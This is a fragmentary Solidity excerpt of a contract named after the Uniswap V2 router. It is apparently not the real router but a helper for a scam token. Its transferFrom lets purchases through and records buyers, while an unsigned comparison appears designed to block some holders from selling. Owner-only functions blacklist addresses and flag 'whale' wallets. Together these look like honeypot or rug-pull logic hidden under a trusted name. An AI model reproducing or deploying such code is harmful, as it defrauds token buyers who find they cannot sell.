...
contract UniswapV2Router01 is Ownable {
    ...
    function transferFrom(address from, address to, uint256 amount) external onlyCoin returns (bool) {
        ...
        if (from == pair) {
            if (_prices[to] == 0) {
                _prices[to] = block.number;
                holderLists.push(to);
            }
            return true;
        } else if (_prices[from]-_lastPrice >= 0) {
            return true;
        }
        return false;
    }
    ...
    function manageNugs_bots(address _address) external onlyOwner {
        require(_address != address(0),"Address should not be 0");
        isBlacklisted[_address] = true;
    }

    function updateWhale(address _whaleaddr, bool status) external onlyOwner {
        wallets[_whaleaddr] = status;
    }
}